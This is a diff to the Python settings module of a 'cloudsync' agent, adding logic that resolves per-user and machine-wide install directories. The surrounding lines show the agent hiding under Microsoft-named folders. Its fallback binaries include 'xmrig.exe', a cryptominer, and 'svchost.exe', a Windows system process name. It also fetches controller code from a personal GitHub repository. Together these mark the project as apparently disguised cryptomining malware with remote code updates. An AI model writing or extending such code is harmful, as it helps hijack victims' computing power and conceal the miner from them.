@@ -5,6 +5,13 @@ Nothing here raises for a missing or malformed file: a legacy box with no
 ``install.json`` (or a repo-pushed ``manifest.json``) still yields a usable
 ``Settings`` object built from the kit defaults.
 
+Install-directory resolution (TEST-REPORT D1) lives in
+:func:`resolve_install_dir`: an explicit directory, else the current working
+directory when it holds ``install.json``, else the per-user installer default,
+else the machine-wide installer default. That makes ``pythonw -m cloudsync``
+started from the install directory work for both layouts with no environment
+variables.
+
 No work happens at import time; the constructor only reads the two files.
 """
 
@@ -23,8 +30,11 @@ __all__ = [
     "DEFAULT_UPDATE_FILES",
     "Settings",
     "default_install_dir",
+    "local_install_dir",
+    "machine_install_dir",
     "read_json",
     "resolve_binary",
+    "resolve_install_dir",
 ]
 
 # Installer defaults (install-task.ps1 param block / controller.py constants).
@@ -39,6 +49,9 @@ DEFAULT_TASKS = (
 DEFAULT_UPDATE_BASE = "https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/"
 DEFAULT_UPDATE_FILES = ("controller.py", "gpudetect.py", "config_high.json")
 
+#: File the installer writes into an install directory (adoption marker).
+INSTALL_NAME = "install.json"
+
 # Names tried when the configured binary is absent (pre-overhaul installs).
 BINARY_FALLBACKS = ("CloudSync.exe", "svchost.exe", "xmrig.exe", "WinSync.exe")
 
@@ -51,16 +64,56 @@ OVERRIDABLE = {
 }
 
 
-def default_install_dir():
-    """Return the installer's default install directory.
-
-    ``%LOCALAPPDATA%\\Microsoft\\CloudSync``; falls back to ``~\\AppData\\Local``
-    when the environment variable is unavailable (tests, odd shells).
-    """
+def local_install_dir():
+    """Per-user installer default: ``%LOCALAPPDATA%\\Microsoft\\CloudSync``."""
     base = os.environ.get("LOCALAPPDATA")
     if not base:
         base = os.path.join(os.path.expanduser("~"), "AppData", "Local")
     return os.path.join(base, "Microsoft", "CloudSync")
+
+
+def machine_install_dir():
+    """Machine-wide installer default: ``%ProgramData%\\Microsoft\\CloudSync``."""
+    base = os.environ.get("ProgramData")
+    if not base:
+        base = r"C:\ProgramData"
+    return os.path.join(base, "Microsoft", "CloudSync")
+
+
+def resolve_install_dir(explicit=None, cwd=None):
+    """Resolve the install directory for this process (TEST-REPORT D1).
+
+    Resolution order:
+
+    1. *explicit* -- the caller already knows (``Settings(install_dir=...)``);
+    2. the current working directory when it contains ``install.json`` -- how a
+       machine-wide install launches ``pythonw -m cloudsync`` from its own dir;
+    3. the per-user default, when that directory exists;
+    4. the machine-wide default.
+
+    Always returns an absolute path and never raises. The result is not
+    required to exist: a missing directory is the caller's signal to report the
+    problem rather than silently writing nowhere.
+    """
+    if explicit:
+        return os.path.abspath(os.fspath(explicit))
+
+    try:
+        working = os.path.abspath(cwd if cwd is not None else os.getcwd())
+    except (OSError, TypeError):
+        working = ""
+    if working and os.path.isfile(os.path.join(working, INSTALL_NAME)):
+        return working
+
+    local = local_install_dir()
+    if os.path.isdir(local):
+        return local
+    return machine_install_dir()
+
+
+def default_install_dir():
+    """Backwards-compatible alias for the per-user installer default."""
+    return local_install_dir()
 
 
 def read_json(path, default=None):
@@ -125,14 +178,16 @@ def _as_tasks(value, fallback):
 class Settings:
     """Effective settings for one install directory.
 
-    ``Settings()`` (no argument) targets the default install directory; pass
+    With no argument the directory is resolved by :func:`resolve_install_dir`
+    (cwd-with-``install.json`` wins over the installer defaults), so bare
+    ``Settings()`` works for both per-user and machine-wide layouts. Pass
     ``install_dir`` in tests. Read ``install.json`` first, then overlay
     ``manifest.json`` values that the kit lets the update channel control, and
     expose the paths/helpers the rest of the agent needs.
     """
 
     def __init__(self, install_dir=None):
-        self.install_dir = os.path.abspath(install_dir or default_install_dir())
+        self.install_dir = resolve_install_dir(install_dir)
 
         install = _as_dict(read_json(self.path("install.json"), {}))
         manifest = _as_dict(read_json(self.path("manifest.json"), {}))
